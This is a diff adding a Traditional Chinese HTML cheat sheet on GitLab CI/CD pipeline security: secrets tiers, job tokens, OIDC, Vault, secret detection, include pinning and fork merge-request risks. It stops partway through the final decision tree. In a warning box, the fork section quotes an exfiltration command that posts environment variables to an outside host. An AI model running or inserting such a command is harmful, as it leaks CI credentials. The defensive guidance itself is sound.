@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="zh-Hant">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GitLab CI/CD Cheat Sheet - 08. Pipeline Security</title>
+<style>
+  :root {
+    --primary: #FC6D26;
+    --primary-dark: #E24329;
+    --bg: #FAFAFA;
+    --card: #FFFFFF;
+    --text: #2E2E2E;
+    --muted: #6C6C6C;
+    --border: #E5E5E5;
+    --code-bg: #F4F4F4;
+    --beginner: #2E7D32;
+    --intermediate: #1565C0;
+    --advanced: #6A1B9A;
+    --warning: #B71C1C;
+    --hint-bg: #FFF8E1;
+  }
+  * { box-sizing: border-box; }
+  body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "PingFang TC", "Microsoft JhengHei", sans-serif; background: var(--bg); color: var(--text); line-height: 1.6; }
+  header { background: linear-gradient(135deg, var(--primary-dark), var(--primary)); color: white; padding: 2rem 1.5rem; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+  header h1 { margin: 0 0 .5rem; font-size: 1.8rem; }
+  header .subtitle { opacity: 0.95; font-size: 1rem; }
+  header .meta { font-size: .85rem; opacity: 0.85; margin-top: .75rem; }
+  main { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+  nav.toc { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 1rem 1.25rem; margin-bottom: 1.5rem; }
+  nav.toc h3 { margin: 0 0 .5rem; font-size: 1rem; color: var(--primary-dark); }
+  nav.toc ul { margin: 0; padding-left: 1.25rem; }
+  nav.toc li { margin: .25rem 0; }
+  nav.toc a { color: var(--text); text-decoration: none; }
+  nav.toc a:hover { color: var(--primary-dark); text-decoration: underline; }
+  section { background: var(--card); border: 1px solid var(--border); border-radius: 8px; margin-bottom: 1.5rem; overflow: hidden; }
+  section > h2 { margin: 0; padding: .9rem 1.25rem; background: #F7F7F7; border-bottom: 1px solid var(--border); font-size: 1.2rem; color: var(--primary-dark); }
+  .content { padding: 1.25rem; }
+  .level { display: inline-block; padding: .15rem .55rem; border-radius: 999px; font-size: .75rem; font-weight: 600; color: white; margin-right: .5rem; vertical-align: middle; }
+  .level.b { background: var(--beginner); }
+  .level.i { background: var(--intermediate); }
+  .level.a { background: var(--advanced); }
+  h3.depth { font-size: 1.05rem; margin: 1.5rem 0 .6rem; padding-bottom: .3rem; border-bottom: 2px dashed var(--border); }
+  h3.depth:first-child { margin-top: 0; }
+  code { background: var(--code-bg); padding: .1rem .35rem; border-radius: 4px; font-size: .9em; font-family: "SF Mono", Consolas, Monaco, monospace; }
+  pre { background: #2B2B2B; color: #F8F8F2; padding: .9rem 1rem; border-radius: 6px; overflow-x: auto; font-size: .85rem; line-height: 1.5; }
+  pre code { background: transparent; color: inherit; padding: 0; }
+  table { width: 100%; border-collapse: collapse; margin: .75rem 0; font-size: .92rem; }
+  th, td { border: 1px solid var(--border); padding: .5rem .7rem; text-align: left; vertical-align: top; }
+  th { background: #F7F7F7; font-weight: 600; }
+  .tip, .warn, .note { padding: .75rem 1rem; border-radius: 6px; margin: .75rem 0; font-size: .92rem; }
+  .tip { background: #E8F5E9; border-left: 4px solid var(--beginner); }
+  .warn { background: #FFEBEE; border-left: 4px solid var(--warning); }
+  .note { background: var(--hint-bg); border-left: 4px solid var(--primary); }
+  ul.checklist { list-style: none; padding-left: 0; }
+  ul.checklist li { padding: .3rem 0 .3rem 1.7rem; position: relative; }
+  ul.checklist li::before { content: "☐"; position: absolute; left: 0; color: var(--primary); font-weight: bold; }
+  .grid-2 { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 1rem; }
+  .card-mini { background: #FAFAFA; border: 1px solid var(--border); border-radius: 6px; padding: .8rem 1rem; }
+  .card-mini h4 { margin: 0 0 .4rem; color: var(--primary-dark); font-size: .95rem; }
+  footer { text-align: center; padding: 2rem 1rem; color: var(--muted); font-size: .85rem; }
+  footer a { color: var(--primary-dark); }
+  .sev-high { background: #FFEBEE; border-left: 4px solid #B71C1C; padding: .75rem 1rem; border-radius: 6px; margin: .75rem 0; }
+  .sev-high strong { color: #B71C1C; }
+  @media (max-width: 600px) {
+    header h1 { font-size: 1.4rem; }
+    main { padding: 1rem; }
+    .content { padding: 1rem; }
+  }
+</style>
+</head>
+<body>
+<header>
+  <h1>08. Pipeline Security — 管線安全</h1>
+  <div class="subtitle">Secrets Management、Job Token、Secure Files、OIDC、Secret Detection、供應鏈安全</div>
+  <div class="meta">來源:docs.gitlab.com/ci/pipeline_security/ | 系列 8/14</div>
+</header>
+
+<main>
+
+<nav class="toc">
+  <h3>📑 本篇目錄</h3>
+  <ul>
+    <li><a href="#overview">安全威脅模型</a></li>
+    <li><a href="#secrets-layered">1. Secrets 管理的層級</a></li>
+    <li><a href="#job-token">2. CI_JOB_TOKEN 管理</a></li>
+    <li><a href="#secure-files">3. Secure Files</a></li>
+    <li><a href="#oidc">4. OIDC(ID Token)</a></li>
+    <li><a href="#vault">5. HashiCorp Vault 整合</a></li>
+    <li><a href="#cloud">6. 雲端整合(AWS / GCP / Azure)</a></li>
+    <li><a href="#secret-detection">7. Secret Detection</a></li>
+    <li><a href="#supply-chain">8. 供應鏈安全(include / components)</a></li>
+    <li><a href="#fork-security">9. Fork MR 安全</a></li>
+    <li><a href="#cheatsheet">⚡ 速查表</a></li>
+  </ul>
+</nav>
+
+<section id="overview">
+  <h2>🗺️ 安全威脅模型</h2>
+  <div class="content">
+    <p>CI/CD pipeline 是攻擊者的高價值目標:<strong>一旦攻破,能竊取密鑰、汙染部署、植入後門</strong>。典型威脅:</p>
+
+    <div class="grid-2">
+      <div class="card-mini">
+        <h4>🕵️ Secret 外洩</h4>
+        程式碼內寫死密碼、log 輸出 secret、CI 變數被偷
+      </div>
+      <div class="card-mini">
+        <h4>🎭 供應鏈攻擊</h4>
+        include 的第三方檔案被改、Component 被注入惡意程式
+      </div>
+      <div class="card-mini">
+        <h4>🍴 Fork MR 攻擊</h4>
+        外部貢獻者藉 MR 執行惡意程式、偷取 parent project 的 secret
+      </div>
+      <div class="card-mini">
+        <h4>🔓 Token 濫用</h4>
+        CI_JOB_TOKEN 可存取非預期的專案或 API
+      </div>
+      <div class="card-mini">
+        <h4>⚡ Runner 逃逸</h4>
+        privileged runner 被惡意 job 利用;job 橫向移動到其他 job
+      </div>
+      <div class="card-mini">
+        <h4>📦 構建產物污染</h4>
+        build 出的 image 含後門、相依套件被 typosquatting
+      </div>
+    </div>
+
+    <h3 class="depth"><span class="level a">架構視角</span>縱深防禦</h3>
+    <p>單一機制不可靠,要多層防護:</p>
+    <pre><code>訊息/身分    Protected branch + protected variable + protected runner
+   ↓
+傳輸        OIDC + short-lived credentials(非長期 secret)
+   ↓
+儲存        External Secrets Manager(Vault / KMS)
+   ↓
+使用        Mask + Environment scope + Job Token limit
+   ↓
+偵測        Secret Push Protection + Pipeline Secret Detection
+   ↓
+審查        Review fork MR + Pin include/component 版本</code></pre>
+  </div>
+</section>
+
+<section id="secrets-layered">
+  <h2>🔐 1. Secrets 管理的層級</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>安全等級由低到高</h3>
+    <table>
+      <tr><th>方式</th><th>安全性</th><th>適用</th></tr>
+      <tr><td>YAML 明文</td><td>❌ 最差</td><td><strong>禁用</strong></td></tr>
+      <tr><td>UI Variables(masked)</td><td>⚠️ 基本</td><td>低敏感 config</td></tr>
+      <tr><td>UI Variables(masked + protected + scoped)</td><td>✅ 中</td><td>一般 secret</td></tr>
+      <tr><td>Secure Files</td><td>✅ 中</td><td>檔案類 secret(憑證、keystore)</td></tr>
+      <tr><td>External Secrets(Vault / KMS)</td><td>✅✅ 最高</td><td>生產密鑰、合規要求</td></tr>
+    </table>
+
+    <div class="sev-high">
+      <strong>🔴 核心原則</strong><br>
+      <strong>最敏感的 secret 應放在 External Secrets Manager,不是 CI Variables。</strong>
+      CI Variables 的值存在 GitLab 專案設定裡,有 Settings 權限的人都能看;可以被同名變數覆蓋,難稽核實際用值。
+    </div>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>敏感度分級建議</h3>
+    <table>
+      <tr><th>等級</th><th>範例</th><th>存放</th></tr>
+      <tr><td>Public</td><td>API endpoint URL、版本號</td><td>YAML</td></tr>
+      <tr><td>Internal</td><td>Dev / staging 連線字串</td><td>UI Variable</td></tr>
+      <tr><td>Confidential</td><td>Registry token、Slack webhook</td><td>UI Variable + masked + protected</td></tr>
+      <tr><td>Secret</td><td>Prod DB password、AWS key</td><td>Vault + OIDC,或 environment-scoped UI variable</td></tr>
+      <tr><td>Top Secret</td><td>Signing key、加密主 key</td><td>Vault + HSM,嚴格 audit</td></tr>
+    </table>
+  </div>
+</section>
+
+<section id="job-token">
+  <h2>🎟️ 2. CI_JOB_TOKEN 管理</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>CI_JOB_TOKEN 是什麼?</h3>
+    <p>每個 job 自動拿到一個短期 token,有效範圍是 job 執行期間。用途:</p>
+    <ul>
+      <li>登入 Container Registry(push / pull image)</li>
+      <li>呼叫 GitLab API(讀 MR、建 issue、觸發下游 pipeline)</li>
+      <li>跨專案拉 artifact</li>
+      <li>登入 Package Registry(npm、PyPI、Maven)</li>
+    </ul>
+
+    <h3 class="depth"><span class="level b">Quick Start</span>基本使用</h3>
+    <pre><code>build-and-push:
+  image: docker:24
+  services: [docker:24-dind]
+  script:
+    # 用 CI_JOB_TOKEN 登入 registry
+    - echo "$CI_REGISTRY_PASSWORD" | docker login -u "$CI_REGISTRY_USER" --password-stdin "$CI_REGISTRY"
+    - docker build -t "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA" .
+    - docker push "$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA"
+    # CI_REGISTRY_PASSWORD = CI_JOB_TOKEN</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>Token Access 限制</h3>
+    <div class="warn">⚠️ 預設 <code>CI_JOB_TOKEN</code> 可以存取<strong>所有 public project</strong>。惡意專案可利用這點攻擊你的 project。</div>
+
+    <p>路徑:<code>Project → Settings → CI/CD → Token Access</code></p>
+    <ul>
+      <li>✅ <strong>Limit access to this project</strong>:勾選</li>
+      <li>把信任的專案加到 <strong>Allow listed projects</strong></li>
+      <li>也可加信任的 group(讓該 group 所有 project 能存取)</li>
+    </ul>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>跨專案使用 Job Token</h3>
+    <pre><code># Project A 的 job 呼叫 Project B 的 API
+curl --header "JOB-TOKEN: $CI_JOB_TOKEN" \
+  "https://gitlab.example.com/api/v4/projects/b-id/jobs/artifacts/main/download?job=build"
+
+# 觸發 Project B 的 pipeline
+curl --request POST \
+  --header "JOB-TOKEN: $CI_JOB_TOKEN" \
+  "https://gitlab.example.com/api/v4/projects/b-id/trigger/pipeline"
+
+# 若 Project B 有啟用 Limit access,必須先把 Project A 加到 Allow listed</code></pre>
+
+    <h3 class="depth"><span class="level a">架構視角</span>Token Scope(Job Token Permissions)</h3>
+    <p>新版 GitLab(17+)支援更細粒度的 Job Token 權限:</p>
+    <pre><code># Project → Settings → CI/CD → Job token permissions
+# 可以設定 CI_JOB_TOKEN 能做的 API 動作範圍:
+#   - read_api / read_repository / read_registry
+#   - write_repository / write_registry
+#   - 各 scope 單獨開關</code></pre>
+    <p>最小權限原則:只開真正需要的 scope。</p>
+  </div>
+</section>
+
+<section id="secure-files">
+  <h2>🗂️ 3. Secure Files</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>用途</h3>
+    <p>Secure Files 是<strong>專案層級儲存機密檔案</strong>的機制,比 File type variable 更適合大檔案:</p>
+    <ul>
+      <li>Android keystore(.jks / .keystore)</li>
+      <li>iOS provisioning profile + signing certificate</li>
+      <li>GPG 私鑰</li>
+      <li>TLS 憑證</li>
+    </ul>
+
+    <p>路徑:<code>Project → Settings → CI/CD → Secure Files</code></p>
+
+    <h3 class="depth"><span class="level b">Quick Start</span>使用範例</h3>
+    <pre><code>sign-apk:
+  image: alpine:latest
+  before_script:
+    # 下載 Secure Files
+    - apk add curl
+    - curl --silent "https://gitlab.com/gitlab-org/incubation-engineering/mobile-devops/download-secure-files/-/raw/main/installer" | bash
+    # 下載完的檔案在 .secure_files/ 資料夾
+  script:
+    - jarsigner -keystore .secure_files/release.keystore \
+        -storepass "$KEYSTORE_PASS" \
+        app-release-unsigned.apk \
+        release-key</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>Secure Files 優勢</h3>
+    <ul>
+      <li>最多 100 個檔案,每個最大 5MB</li>
+      <li>可設 <strong>Permanent</strong>(不可覆寫,保護歷史版本)</li>
+      <li>比 File type Variable 更好管(有 UI 列表)</li>
+      <li>跨 job 可用(不用 artifact 傳遞)</li>
+    </ul>
+    <p>限制:只能在 Project 層,不能 Group / Instance 共用。</p>
+  </div>
+</section>
+
+<section id="oidc">
+  <h2>🎫 4. OIDC(ID Token)</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>OIDC 解決什麼問題?</h3>
+    <p>傳統做法:把 AWS key / GCP service account 存成 CI Variable。問題:</p>
+    <ul>
+      <li>長期存在,一旦洩漏影響大</li>
+      <li>GCP JSON key 沒辦法 mask(格式不符 mask 規則)</li>
+      <li>無法細粒度控制「哪個 job 可以拿」</li>
+    </ul>
+
+    <p><strong>OIDC 方案:</strong>GitLab 發行<strong>短期 JWT</strong> 給 job,由雲端 IDP 驗證後換成<strong>短期 access token</strong>(通常 1 小時)。無須存長期 credential。</p>
+
+    <h3 class="depth"><span class="level b">Quick Start</span>id_tokens 關鍵字</h3>
+    <pre><code>job:
+  id_tokens:
+    AWS_ID_TOKEN:            # 變數名稱自訂
+      aud: https://aws.amazon.com   # 雲端驗證的 audience
+  script:
+    - echo "$AWS_ID_TOKEN"   # 印出 JWT(應該用於換 token,不是 echo)</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>JWT 中的常見 claims</h3>
+    <table>
+      <tr><th>Claim</th><th>意義</th></tr>
+      <tr><td><code>iss</code></td><td>GitLab URL(簽發者)</td></tr>
+      <tr><td><code>sub</code></td><td>專案路徑 + ref(識別身分)</td></tr>
+      <tr><td><code>aud</code></td><td>你指定的 audience</td></tr>
+      <tr><td><code>project_id</code></td><td>專案 ID</td></tr>
+      <tr><td><code>project_path</code></td><td>專案路徑</td></tr>
+      <tr><td><code>namespace_id</code></td><td>group ID</td></tr>
+      <tr><td><code>ref</code></td><td>分支 / tag 名</td></tr>
+      <tr><td><code>ref_type</code></td><td>branch / tag</td></tr>
+      <tr><td><code>ref_protected</code></td><td>是否 protected</td></tr>
+      <tr><td><code>user_login</code></td><td>觸發者 username</td></tr>
+      <tr><td><code>environment</code></td><td>job 對應的 environment(若有)</td></tr>
+      <tr><td><code>exp</code></td><td>過期時間(通常 5 分鐘)</td></tr>
+    </table>
+
+    <h3 class="depth"><span class="level a">架構視角</span>雲端信任策略</h3>
+    <p>雲端設定 trust policy 時,應該依 claims 限制:</p>
+    <pre><code>// AWS IAM trust policy 範例
+{
+  "Effect": "Allow",
+  "Principal": {
+    "Federated": "arn:aws:iam::123456789012:oidc-provider/gitlab.example.com"
+  },
+  "Action": "sts:AssumeRoleWithWebIdentity",
+  "Condition": {
+    "StringEquals": {
+      "gitlab.example.com:aud": "https://aws.amazon.com",
+      "gitlab.example.com:project_path": "my-group/my-project"
+    },
+    "StringLike": {
+      "gitlab.example.com:ref": "refs/heads/main"
+    },
+    "Bool": {
+      "gitlab.example.com:ref_protected": "true"
+    }
+  }
+}</code></pre>
+    <p><strong>必要</strong>限制至少 <code>project_path</code> + <code>ref_protected</code>,否則<strong>任何 GitLab 專案</strong>都能 assume 這個 role(史上 CircleCI 事故教訓)。</p>
+  </div>
+</section>
+
+<section id="vault">
+  <h2>🏦 5. HashiCorp Vault 整合</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>secrets 關鍵字</h3>
+    <pre><code>job:
+  id_tokens:
+    VAULT_ID_TOKEN:
+      aud: https://vault.example.com
+  secrets:
+    DB_PASSWORD:
+      vault: production/db/password@ops   # path@engine
+      file: false                          # 當作 env var(預設 true 是檔案)
+      token: $VAULT_ID_TOKEN
+  script:
+    - echo "Using $DB_PASSWORD"            # 會被 mask</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>Vault 伺服器端設定</h3>
+    <pre><code># 1. 啟用 JWT auth method
+vault auth enable jwt
+
+# 2. 告訴 Vault 從哪裡驗證 JWT
+vault write auth/jwt/config \
+  oidc_discovery_url="https://gitlab.example.com" \
+  bound_issuer="gitlab.example.com"
+
+# 3. 建立 role(限定特定專案 / 分支才能拿)
+vault write auth/jwt/role/myproject-prod - <<EOF
+{
+  "role_type": "jwt",
+  "policies": ["myproject-prod"],
+  "token_explicit_max_ttl": 60,
+  "user_claim": "user_email",
+  "bound_audiences": "https://vault.example.com",
+  "bound_claims": {
+    "project_id": "42",
+    "ref_protected": "true",
+    "ref_type": "branch",
+    "ref": "main"
+  }
+}
+EOF
+
+# 4. 寫入 secret
+vault kv put ops/production/db password=super_secret_123</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>多個 engine</h3>
+    <pre><code>job:
+  id_tokens:
+    VAULT_ID_TOKEN:
+      aud: https://vault.example.com
+  secrets:
+    DB_PASSWORD:
+      vault: production/db/password@ops   # kv-v2(預設)
+
+    JFROG_TOKEN:
+      vault:
+        engine:
+          name: generic       # 支援 kv-v1, AWS, Artifactory 等
+          path: artifactory
+        path: production/jfrog
+        field: access_token
+
+    # 動態 AWS credential(Vault AWS engine)
+    AWS_ACCESS_KEY_ID:
+      vault:
+        engine: {name: aws, path: aws}
+        path: creds/deploy-role
+        field: access_key</code></pre>
+
+    <h3 class="depth"><span class="level a">架構視角</span>Vault + GitLab 架構</h3>
+    <pre><code>┌────────────┐   1. 跑 job      ┌────────────┐
+│   GitLab   │────────────────▶│   Runner   │
+└────────────┘                  └─────┬──────┘
+     ▲                                │
+     │ 4. 發 JWT(ID token)           │ 2. 要 secret
+     │                                ▼
+     │                          ┌────────────┐
+     └──────────────────────────│   Vault    │
+        3. Vault 驗證 JWT       └────────────┘
+           (OIDC discovery)
+
+優點:
+- GitLab 不存任何 production secret
+- Vault 有完整 audit log
+- JWT 短期有效,洩漏影響小
+- 支援 dynamic secrets(每次產新的 DB user)</code></pre>
+  </div>
+</section>
+
+<section id="cloud">
+  <h2>☁️ 6. 雲端整合(AWS / GCP / Azure)</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>AWS(STS AssumeRoleWithWebIdentity)</h3>
+    <pre><code>assume-aws-role:
+  image: amazon/aws-cli
+  id_tokens:
+    GITLAB_OIDC_TOKEN:
+      aud: https://aws.amazon.com
+  script:
+    - >
+      export $(printf "AWS_ACCESS_KEY_ID=%s AWS_SECRET_ACCESS_KEY=%s AWS_SESSION_TOKEN=%s"
+      $(aws sts assume-role-with-web-identity
+      --role-arn $ROLE_ARN
+      --role-session-name "GitLabRunner-$CI_PROJECT_ID-$CI_PIPELINE_ID"
+      --web-identity-token $GITLAB_OIDC_TOKEN
+      --duration-seconds 3600
+      --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]'
+      --output text))
+    - aws s3 ls</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>GCP(Workload Identity Federation)</h3>
+    <pre><code>deploy-gcp:
+  image: google/cloud-sdk:latest
+  id_tokens:
+    GCP_ID_TOKEN:
+      aud: //iam.googleapis.com/projects/123/locations/global/workloadIdentityPools/gitlab-pool/providers/gitlab
+  script:
+    - echo "$GCP_ID_TOKEN" > token.json
+    - |
+      gcloud iam workload-identity-pools create-cred-config \
+        "projects/123/locations/global/workloadIdentityPools/gitlab-pool/providers/gitlab" \
+        --service-account="gitlab-ci@my-project.iam.gserviceaccount.com" \
+        --service-account-token-lifetime-seconds=600 \
+        --output-file=cred.json \
+        --credential-source-file=token.json
+    - gcloud auth login --cred-file=cred.json
+    - gcloud storage cp app.tar.gz gs://my-bucket/</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>Azure(Federated Credentials)</h3>
+    <pre><code>deploy-azure:
+  image: mcr.microsoft.com/azure-cli
+  id_tokens:
+    AZURE_OIDC_TOKEN:
+      aud: api://AzureADTokenExchange
+  script:
+    - az login --service-principal \
+        -u $AZURE_CLIENT_ID \
+        -t $AZURE_TENANT_ID \
+        --federated-token $AZURE_OIDC_TOKEN
+    - az deployment group create ...</code></pre>
+
+    <h3 class="depth"><span class="level a">架構視角</span>OIDC vs 長期 credential 比較</h3>
+    <table>
+      <tr><th></th><th>長期 credential(IAM user key)</th><th>OIDC</th></tr>
+      <tr><td>credential 壽命</td><td>永久(需人手輪替)</td><td>自動短期(1 小時)</td></tr>
+      <tr><td>洩漏影響</td><td>災難性</td><td>有限(快過期)</td></tr>
+      <tr><td>Audit 可能性</td><td>低(不知誰用)</td><td>高(含 job/user 資訊)</td></tr>
+      <tr><td>細粒度權限</td><td>IAM policy</td><td>IAM policy + JWT claims</td></tr>
+      <tr><td>設定複雜度</td><td>簡單</td><td>較複雜(需 trust 設定)</td></tr>
+      <tr><td>推薦度</td><td>❌ 避免</td><td>✅ 強烈推薦</td></tr>
+    </table>
+  </div>
+</section>
+
+<section id="secret-detection">
+  <h2>🔍 7. Secret Detection</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>三種偵測層次</h3>
+    <table>
+      <tr><th>層次</th><th>時機</th><th>層級</th></tr>
+      <tr><td><strong>Secret Push Protection</strong></td><td>push 時就擋(在 server 端)</td><td>Ultimate</td></tr>
+      <tr><td><strong>Pipeline Secret Detection</strong></td><td>MR / pipeline 跑</td><td>Free(Ultimate 有 MR widget)</td></tr>
+      <tr><td><strong>Client-side Secret Detection</strong></td><td>Web IDE 編輯時即時提示</td><td>Ultimate</td></tr>
+    </table>
+
+    <h3 class="depth"><span class="level b">Quick Start</span>啟用 Pipeline Secret Detection</h3>
+    <pre><code># 方式 1:include template
+include:
+  - template: Security/Secret-Detection.gitlab-ci.yml
+
+# 方式 2:用 Component
+include:
+  - component: $CI_SERVER_FQDN/components/secret-detection/secret-detection@1</code></pre>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>啟用 Push Protection(Ultimate)</h3>
+    <p>路徑:<code>Project → Settings → Secure → Secret push protection</code></p>
+    <ul>
+      <li>✅ 勾選啟用</li>
+      <li>push 時若偵測到 secret,<strong>整個 push 被拒絕</strong></li>
+      <li>使用者可用 <code>[skip secret push protection]</code> commit message 跳過(僅在必要時)</li>
+    </ul>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>Secret 洩漏應變 5 步驟</h3>
+    <div class="sev-high">
+      <strong>🔴 發現 secret 外洩時:</strong>
+      <ol style="margin: .3rem 0 0;">
+        <li><strong>撤銷</strong>:立即到 AWS / GitLab / DB 把該 token 作廢</li>
+        <li><strong>調查</strong>:查 audit log 看是否已被使用</li>
+        <li><strong>輪替</strong>:發新 token,更新所有消費端</li>
+        <li><strong>通知</strong>:若影響正式環境,通知安全團隊</li>
+        <li><strong>清歷史</strong>(最後):<code>git filter-repo</code> 從 Git 歷史刪除</li>
+      </ol>
+    </div>
+    <div class="warn">⚠️ <strong>先撤銷,再清歷史。</strong>token 已可能被 clone 走了,清 Git 歷史救不回。</div>
+
+    <h3 class="depth"><span class="level a">架構視角</span>Custom Ruleset(Ultimate)</h3>
+    <p>預設偵測常見 token(AWS、GCP、Stripe 等)。若貴組織有自訂 token,可加偵測規則:</p>
+    <pre><code># .gitlab/secret-detection-ruleset.toml
+[[rules]]
+description = "Company-specific API key"
+id = "company-api-key"
+regex = '''mycorp-api-[a-zA-Z0-9]{32}'''
+keywords = ["mycorp-api-"]</code></pre>
+  </div>
+</section>
+
+<section id="supply-chain">
+  <h2>🔗 8. 供應鏈安全(include / components)</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>核心原則</h3>
+    <div class="warn">⚠️ <code>include</code> 的外部 YAML 可以執行任意程式碼。若被汙染,你的 pipeline 就被挾持。</div>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>安全 include</h3>
+    <pre><code># ✅ 推薦:釘 commit SHA
+include:
+  - project: 'my-group/ci-templates'
+    ref: 8b0c8b318857c8211c15c6643b0894345a238c4e
+    file: '/templates/build.yml'
+
+# ✅ 可接受:釘 protected tag
+include:
+  - project: 'my-group/security'
+    ref: v2.1.0
+    file: '/templates/scan.yml'
+
+# ✅ Component 釘完整版本
+include:
+  - component: $CI_SERVER_FQDN/my-group/components/docker-build@1.2.3
+
+# ❌ 避免:用 branch 名(可被改)
+include:
+  - project: 'my-group/ci-templates'
+    ref: main                         # ← 隨時可能變
+    file: '/templates/build.yml'
+
+# ❌ 避免:remote 檔案
+include:
+  - remote: 'https://example.com/ci.yml'   # ← 外部網站可變造
+
+# ❌ 避免:版本範圍
+include:
+  - component: external/scan@~latest   # ← 可能被推新版本攻擊</code></pre>
+
+    <h3 class="depth"><span class="level a">架構視角</span>第三方元件審查</h3>
+    <p>用 Catalog 上的第三方 Component 前:</p>
+    <ul class="checklist">
+      <li>讀原始碼,看 script 做什麼</li>
+      <li>檢查 token / credential 用法是否合理</li>
+      <li>釘死完整版本(不用 ~latest)</li>
+      <li>只給最小必要權限</li>
+      <li>定期 review 升級 changelog</li>
+      <li>考慮 fork 到內部 catalog(多一層審查)</li>
+    </ul>
+
+    <h3 class="depth"><span class="level a">架構視角</span>Pinned versions 實務</h3>
+    <pre><code># Node 版本(避免 supply chain)
+build:
+  script:
+    - nvm install 20.11.1      # 釘完整版本
+    - nvm use 20.11.1
+    - npm ci                    # 用 lock file,不用 npm install
+    - npm run build
+
+# Docker base image
+FROM node:20.11.1-alpine3.19  # ✅ 完整 tag
+# FROM node:latest            # ❌ 絕對不用</code></pre>
+  </div>
+</section>
+
+<section id="fork-security">
+  <h2>🍴 9. Fork MR 安全</h2>
+  <div class="content">
+    <h3 class="depth"><span class="level b">Quick Start</span>Fork MR 的風險</h3>
+    <p>外部貢獻者的 fork MR 有兩種執行模式:</p>
+    <table>
+      <tr><th>模式</th><th>runner / 變數來源</th><th>風險</th></tr>
+      <tr><td>預設(在 fork 端)</td><td>Fork project 自己的 runner / variable</td><td>✅ 安全(拿不到 parent 資料)</td></tr>
+      <tr><td>在 parent 端(手動觸發)</td><td>Parent project 的 runner / variable</td><td>⚠️ Fork 的惡意 script 可偷 parent secret</td></tr>
+    </table>
+
+    <div class="sev-high">
+      <strong>🔴 真實案例</strong><br>
+      過去多個開源專案因 fork MR 的 CI 腳本被改,執行 <code>curl -d @/env external.com</code> 把所有環境變數外傳,造成 AWS key 洩漏。
+    </div>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>防範措施</h3>
+    <ol>
+      <li><strong>使用 Protected Variable</strong> — fork MR 非 protected branch,拿不到</li>
+      <li><strong>使用 Environment scope</strong> — production scope 的 variable 不給 test job</li>
+      <li><strong>謹慎手動觸發</strong> — 點 "Run pipeline" 前 review 程式變更</li>
+      <li><strong>不信任的 fork runner</strong> — 改在 parent 端跑(但要先 review)</li>
+    </ol>
+
+    <h3 class="depth"><span class="level i">SRE 實務</span>設定層面</h3>
+    <p>路徑:<code>Project → Settings → CI/CD → General pipelines</code></p>
+    <ul>
+      <li><strong>Pipelines for fork merge requests</strong>:是否允許在 parent 跑</li>
+      <li>也可用 API 完全關閉 <code>ci_allow_fork_pipelines_to_run_in_parent_project</code></li>
+    </ul>
+
+    <h3 class="depth"><span class="level a">架構視角</span>review workflow</h3>
+    <p>高風險專案建議流程:</p>
+    <ol>
+      <li>外部貢獻者開 MR</li>
+      <li>CI 在 fork 端跑基本檢查(lint、test)</li>
+      <li>Maintainer review 程式變更</li>
+      <li>若無問題,手動觸發「在 parent 跑」拿 production 資源測</li>
+      <li>review 通過後 merge</li>
+    </ol>
+  </div>
+</section>
+
+<section id="cheatsheet">
+  <h2>⚡ 速查表</h2>
+  <div class="content">
+
+    <h3 class="depth">🏆 Pipeline Security 20 條 Checklist</h3>
+    <ul class="checklist">
+      <li>Secret 不寫在 YAML</li>
+      <li>UI Variables 都 masked + protected</li>
+      <li>Production secret 用 Vault / KMS,走 OIDC</li>
+      <li>Environment scope 隔離多環境 secret</li>
+      <li>Protected branch + Protected Runner + Protected Variable 三層保護</li>
+      <li>CI_JOB_TOKEN 限制只能存取本專案(或白名單)</li>
+      <li>Include 檔案釘 commit SHA 或 protected tag</li>
+      <li>第三方 Component 釘完整版本</li>
+      <li>Docker image 釘完整 tag(不用 latest)</li>
+      <li>Secret Push Protection 啟用(Ultimate)</li>
+      <li>Pipeline Secret Detection 在所有專案跑</li>
+      <li>Fork MR 預設在 fork 端跑</li>
+      <li>手動觸發 parent pipeline 前必先 review</li>
+      <li>Runner 非 privileged(除非必要)</li>
+      <li>Runner 分 trust 等級(protected / general)</li>
+      <li>Deployment job 有 environment 與 resource_group</li>
+      <li>Secret 洩漏應變流程已演練</li>
+      <li>OIDC trust policy 限制 project_path + ref_protected</li>
+      <li>Webhook outbound 不許連 local network</li>
+      <li>定期稽核 CI variables 使用</li>
+    </ul>
+
+    <h3 class="depth">🎯 Secret 存放決策樹</h3>
+    <pre><code>要存放的是?
+├─ 一般 config(非敏感)
+│  └─ YAML variables 或 UI Variables
+│
+├─ 敏感但非生產(dev/staging secret)
+│  └─ UI Variables(masked + protected)
+│
+├─ 生產密碼 / 雲端 key
+│  ├─ 有 Vault / KMS?
+│  │  └─ ✅ External Secrets + OIDC(最佳)
